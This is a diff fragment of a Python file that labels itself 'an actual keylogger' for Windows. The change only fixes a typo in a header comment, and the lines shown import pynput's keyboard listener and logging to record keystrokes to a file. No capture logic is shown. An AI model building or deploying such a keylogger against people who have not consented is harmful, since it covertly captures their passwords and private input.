@@ -1,7 +1,7 @@
 
 # WARNING
 # THIS IS AN ACTUAL KEYLOGGER
-# This file is aimed specifically for windowns systems, but when ran ON PURPOSE, will work on any system
+# This file is aimed specifically for windows systems, but when ran ON PURPOSE, will work on any system
 from pynput.keyboard import Key, Listener # import Key is for special keys/characters
                                           # import Listener is for recording key strokes
 import logging # Designed for sending key inputs to a file
